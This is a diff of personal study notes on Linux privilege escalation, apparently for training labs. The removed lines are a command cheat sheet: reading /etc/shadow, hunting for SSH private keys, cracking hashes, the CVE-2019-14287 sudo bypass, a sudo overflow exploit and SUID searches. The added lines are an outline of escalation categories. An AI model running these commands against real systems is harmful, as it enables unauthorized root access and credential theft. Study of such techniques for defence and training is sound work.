@@ -1,197 +1,32 @@
-ps aux - services that is running
-
-#user enum:
----------------------
-sudo -l
-cat etc/passwd
-cat etc/shadow
-cat etc/group
-history
-
-#network enum:
--------------------
-ifconfig
-ip a
-route
-ip neigh
-netstat -ano
-
-#password enum
----------------------
-grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
-locate passwoed | more
-find / -name id_rsa 2> /dev/null
-
-#automated tools
-----------------------
-linpeas
-linEnum
-suggester
-privchecker
-
-#kernel exploit
-----------------------
-github->kernel exploit
-uname -a
--exploit database
--suggester
-
-#passwords&File Persmission:
-----------------------------
-#Escalation via stored passwrords
-history
-su root
-github->payloadsAllTheThings->looting passwd
-linpeas
-
-#Escalation via weak file permissions:
-----------------------------------------
-ls -la /etc/passwd
-ls -la /etc/shadow
-Terminal command -> unshadow passwd shadow
-hashcat.net -> finding hashing type
-
-#Escalation via SSH key:
-----------------------------
-github -> payloadofallthings -> linux escation
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
-ssh-keygen -> to gen key
-after u get id_rsa:
--gedit id_rsa
--chmod 600 id_rsa
--ssh -i id_rsa root@192.168.4.67
-
-#Escalation via sudo shell escaping
----------------------------------------
--sudo -l
--gtfobins
-
-#Escalation via intended functionality
------------------------------------------
--functionality example apache
-
-#Escalation via LD_PRELOAD:
--------------------------------
-sudo -l
-article->https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
-
-#Escalation via CVE-2019-14287
----------------------------------
-sudo -l
-sudo -u#-1 /bin/bash
-sudo -u#4294967295 /bin/bash
-
-#Escalation via CVE-2019-18634
-------------------------------
--sudo buffer overlow
-sudo -l
-cat /etc/sudoers
-pwfeedback -> if its enabled in passwd("*")
-Segmentation fault - shows buffer ovlew exploitations exist
-source code - https://github.com/saleemrashid/sudo-cve-2019-18634
-gcc -o exploit exploit.c
-sudo -v
-
-#SUID
----------------
-chmod
-find / -perm -u=s -type f 2>/dev/null
-gtfobins
-tryhackme-> vulnervity 
-
-============================================
-intro to linux shell
----------------------
-user <--> xterm <--> tty <--> bash
-
-* relative and absolute path
-
----------------------------------
-lab creation
----------------------------------
---Dockerfile--
-FROM ubuntu:latest
-RUN apt-get update && apt-get install -y openssh-server sudo
-RUN useradd -rm -d /home/sshuser -s /bin/bash -g root -G sudo sshuser
-RUN echo "sshuser:password" | chpasswd
-RUN mkdir /var/run/sshd
-EXPOSE 22
-
-CMD ["/usr/sbin/sshd", "-D"]
-
--sudo docker build -t ssh-lab .
--sudo docker run --name ssh-lab --rm -p 22:22 -d ssh-lab
--sudo docker ps  
--sudo docker exec -u root -t -i ssh-lab /bin/bash
--ssh -o "UserKnownHostsFile=/dev/null" sshuser@127.0.01
-
-
-------------
-CMD
-------------
--hostname
--pwd
--id
--whoami
--env
--echo $SHELL
--which
-
----------------------
-Resource management
----------------------
-fdisk -l
-df -h
-du -h
-ps
-ps aux
-ps axjf
-ip address
-ip a
-netstat -ltp
-
-sudo useradd -m <username>
-sudo passwd <username>
-sudo userdel -r <username>
-groups <username>
-groupadd <groupname>
-usermod -a -G <groupname> <username>
-
-apt-get install fdisk
-apt search disk
-apt-get purge fdisk
-apt-get update
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Categories: 
+-Credential Access
+	-reused credential
+	-credentials from configuaration files
+	-credential from local databse
+	-Credentials from bash history
+	-ssh keys
+	-sudo access
+	-group privilages
+	
+-Exploit
+	-Service Running on localhost
+	-kernel version
+	-Binary file version
+-Misconfigaration
+	-Cron Jobs
+		+Writeable Cron job
+		+Writeable Cron job Dependancy
+	-SUID/SGID files
+	-Interesting capabilities on binaries
+	-Sensitive file Writeable
+		+/etc/passwd
+		+/etc/shadow
+		+/etc/sudoers
+		+configuration files
+	-sensitive files readable
+		+/etc/shadow
+		+/root/.ssh/id_rsa
+	-writeable path
+		+root $PATH writeable
+		+Directory in PATH writeable
+	-LD_PRELOAD set in /etc/sudoers
